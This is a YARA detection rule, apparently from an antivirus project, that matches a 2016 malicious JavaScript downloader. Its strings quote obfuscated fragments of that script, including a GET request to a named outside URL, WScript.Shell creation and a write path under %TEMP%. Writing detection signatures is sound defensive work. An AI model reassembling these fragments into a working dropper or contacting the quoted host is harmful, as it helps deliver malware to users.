rule sig_20160427_34aa04e8cb55ec52e5f2758bcf0ecbdb {
  meta:
    description = "datamaliciousorder - file 20160427_34aa04e8cb55ec52e5f2758bcf0ecbdb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e20b56d46574ea911605e5d0e1f8795edf49132053d3f54acae7911756f2992"

  strings:
    $s1  = "CkkdnSnkjb[CaejiSlzmj](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function MroxuNbzvj() {return VyewtKatpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"sImuya8" ascii
    $s3  = "function MroxuNbzvj() {return VyewtKatpp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"sImuya8" ascii
    $s4  = "function NgfwoPqxuf(QxagiDpjyu, BzloeHfwzs){ItggkGqogn = ItggkGqogn * 1; return QxagiDpjyu - BzloeHfwzs;};" fullword ascii
    $s5  = "var VyewtKatpp = function IjmjtZqiam() {return FrnliRqnoc[YylpqBgthp](\"WScript\"+\".Shell\");}(), ZruosCtwxc = 11;" fullword ascii
    $s6  = "var FrnliRqnoc = this[\"WScript\"];" fullword ascii
    $s7  = "function RfzoiRgjpe(){return YqmqiJwfxj + \"\";};" fullword ascii
    $s8  = "if (CkkdnSnkjb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function SdfkbDfmvp() {return ((SaiinIvdfa == true) && (SaiinIvdfa == SfqjoDfzpl)) ? 1 : ItggkGqogn;};" fullword ascii
    $s10 = "SojwiBgjup = true;" fullword ascii
    $s11 = "SaiinIvdfa = true; " fullword ascii
    $s12 = "function QvatrArmgs(){return YylpqBgthp;};" fullword ascii
    $s13 = "function BnunnVpwho()" fullword ascii
    $s14 = "return NgfwoPqxuf(HyzqtXmcbz, XyqogZplos);" fullword ascii
    $s15 = "function GuemaGeila(PjaimJasnd) {var JevxkQxpji = (1, 2, 3, 4, 5, PjaimJasnd); return JevxkQxpji;};" fullword ascii
    $s16 = "var SaiinIvdfa = false;" fullword ascii
    $s17 = "var SfqjoDfzpl = false;" fullword ascii
    $s18 = "var SojwiBgjup = false;" fullword ascii
    $s19 = "var XkzydEtttx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "SfqjoDfzpl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}